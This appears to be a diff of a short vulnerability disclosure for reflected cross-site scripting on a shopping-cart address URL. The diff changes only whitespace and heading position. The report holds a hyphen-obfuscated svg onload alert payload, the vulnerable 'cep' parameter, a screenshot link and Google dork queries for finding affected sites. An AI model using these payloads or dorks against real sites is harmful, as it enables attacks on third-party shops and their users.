@@ -9,15 +9,17 @@ Example payload:
 <s-v-g o-n-l-o-a-d=a-l-e-r-t-('r00t1ng')>
 ```
 <br>
+
 # Step to reproduce:
 - On url, change a fields /carrinho/endereco/adicionar?cep={INJECT_HERE}
 <br> 
 <br> 
+
 # Proof of Concept
 <img src="https://i.imgur.com/O1Gq62d.png">
 <br>
 <br>
-# Google Hacking:
 
+# Google Hacking:
 inurl: carrinho/endereco/adicionar?cep= <br>
 inurl: endereco/adicionar?cep=
